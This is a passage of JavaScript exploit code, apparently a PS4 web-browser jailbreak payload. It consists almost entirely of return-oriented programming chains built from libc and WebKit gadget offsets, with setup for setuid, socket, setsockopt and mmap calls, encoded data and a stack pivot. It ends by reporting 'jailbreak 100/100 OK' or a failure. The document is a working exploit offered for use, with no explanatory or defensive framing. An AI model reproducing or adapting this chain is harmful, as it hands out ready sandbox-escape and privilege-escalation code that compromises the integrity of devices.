libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+392440, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setuid_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+393768, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
socket_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+395096, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
mmap_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+396424, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([216, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967072, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+793877 
]);
db([4294967216, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+547950, 
libc_base+877175, 
libc_base+793877 
]);
db([1, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+397800, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
db([0, 0, 100000, 0, 0, 0]);
db([0, 0, 100000, 0, 0, 0]);
db([979788149, 174335264, 0, 0]);
ropchain_offset += 2;
db([1952737651, 807419168, 2020091256, 628633632, 175664236, 0]);
db([1801678707, 1030976613, 1797284901, 1969583473, 624784229, 2660]);
db([543580533, 169962351, 0, 0]);
db([1919252079, 1601200492, 544760937, 1680154685, 10, 0]);
db([1919252079, 1601200492, 544760937, 1680154685, 10, 0]);
db([1601463655, 1769237360, 678389358, 540876841, 680997, 0]);
db([544498793, 1868981602, 1663067506, 1970434671, 1869182064, 2112110]);
db([2016555045, 32]);
db([10, 0]);
db([544498793, 1702127201, 1868767346, 1886745202, 1852795252, 2105402]);
db([2016555045, 32]);
db([10, 0]);
db([1601463667, 1769237360, 678389358, 540876841, 680997, 0]);
db([1634889843, 1634557817, 540876912, 1814394928, 686188, 0]);
set_gadgets([
libc_base+788575, 
ropchain+398200, 
webkit_base+14461559, 
libc_base+206806, 
ropchain+398224, 
webkit_base + 0x36f8ef,
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+398272, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(ropchain+398288,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398544, 
webkit_base+14461559, 
libc_base+793877 
]);
db([4294967200, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877, 
ropchain+398584, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877, 
ropchain+398632, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+206806, 
ropchain+398480 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294901759, 4294967295]); 
set_gadget(webkit_base+5202439,); 
db([0, 0]); 
set_gadget(ropchain+398544,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967200, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294964280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+399048, 
webkit_base+14461559, 
libc_base+788575 
]);
db([12792335, 0]); 
set_gadgets([
libc_base+207901, 
libc_base+788575, 
ropchain+398848, 
webkit_base+14461559, 
libc_base+792472 
]);
db([3221225730, 0]); 
db([0, 0]); 
set_gadgets([
libc_base+206806, 
ropchain+398920, 
libc_base+207901, 
libc_base+846253, 
libc_base+206806, 
ropchain+398924, 
libc_base+207901, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+186490, 
libc_base+792472 
]);
db([8, 0]); 
set_gadgets([
libc_base+407313, 
libc_base+792472 
]);
db([72, 0]); 
set_gadgets([
libc_base+407313, 
libc_base+186490, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+1838146, 
libc_base+793877 
]);
db([0, 0]); 
set_gadgets([
webkit_base+4185979, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([1179403647, 0]);
set_gadgets([
libc_base+207901, 
libc_base+793877 
]);
db([4294966128, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+180192, 
libc_base+207901, 
libc_base+793877 
]);
db([4294967262, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([105961, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+788575 
]);
db([55, 0]); 
set_gadget(libc_base+793877,); 
db([4294266680, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+270033, 
libc_base+793877 
]);
db([4294967293, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+270033, 
libc_base+793877 
]);
db([4291139525, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([1259, 0]); 
set_gadgets([
libc_base+207900, 
libc_base+793877 
]);
db([3432168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([32227377, 0]); 
set_gadgets([
libc_base+207901, 
libc_base+793877 
]);
db([4289525250, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([37008, 0]); 
set_gadgets([
libc_base+207900, 
libc_base+793877 
]);
db([4283557566, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([2, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+792472 
]);
db([4280278604, 4294967295]); 
set_gadgets([
webkit_base+1838146, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 1]); 
set_gadget(libc_base+471355,); 
db([0, 0]); 
set_gadgets([
webkit_base + 0x3cf3f4,
libc_base+11 
]);
db([67, 0]); 
db([514, 0]); 
set_gadget(ropchain+398192,); 
db([59, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(webkit_base+3750700,); 
db([514, 0]); 
db([0, 0]); 
set_gadget(ropchain+398144,); 
db([1224640840, 540045, 196608000, 251658240, 4283810565, 3343386742, 262337, 2336772352, 3204981828, 248, 2964360520, 3120649230, 2, 3617588552, 3506372608, 1608442457, 3284152669, 4202255]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
if(main_ret==179||main_ret==0)
{window.msgs.innerHTML="<h1 style='font-size:30px;text-align:center;'>jailbreak 100/100 OK ✔</h1>";} 
else
{window.msgs.innerHTML="<h1 style='font-size:30px;text-align:center;'>Jailbreak failed! - Reboot your PS4 and try again.</h1>";}}